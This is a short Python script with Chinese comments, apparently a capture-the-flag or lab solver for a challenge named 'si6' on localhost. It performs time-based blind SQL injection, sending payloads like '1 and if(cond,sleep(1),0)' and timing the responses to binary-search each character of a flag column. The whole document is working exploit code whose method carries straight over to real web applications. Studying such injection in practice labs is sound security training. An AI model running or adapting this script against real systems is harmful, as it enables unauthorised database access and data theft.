# 时间盲注解题脚本（si6）——requests 版，风格和你的 my_first_exp.py 一致
# 运行：python blind_time.py
# 和布尔盲注的区别只有一个：判断信号从'页面内容'换成了'响应时间'

import requests, time  # requests 发请求；time 用来计时

URL = "http://localhost:8083/si6/?id="
TABLE = "flag6_table"
SLEEP = 1  # 条件成立时让数据库睡 1 秒

def ask(cond):
    # 拼 payload：if(条件成立, sleep(1), 0) —— 成立就卡 1 秒，不成立秒回
    payload = '1 and if(%s,sleep(%d),0)' % (cond, SLEEP)
    url = URL + payload
    t0 = time.time()          # 记下出发时间
    try:
        requests.get(url, timeout=10)   # 发请求（不关心返回内容！）
    except Exception:
        pass
    elapsed = time.time() - t0  # 算响应耗时
    return elapsed > SLEEP * 0.6  # 卡了超过 0.6 秒 → 条件成立（True）

flag = ''
for pos in range(1, 60):
    lo, hi = 32, 127
    while lo < hi:
        mid = (lo + hi) // 2
        # 条件：flag 第 pos 个字符的 ascii 码 > mid 吗？
        cond = 'ascii(substr((select flag from %s),%d,1))>%d' % (TABLE, pos, mid)
        if ask(cond):
            lo = mid + 1
        else:
            hi = mid
    ch = chr(lo)
    if ch == ' ':
        break
    flag += ch
    print(flag)
    if ch == '}':
        break

print("FLAG:", flag)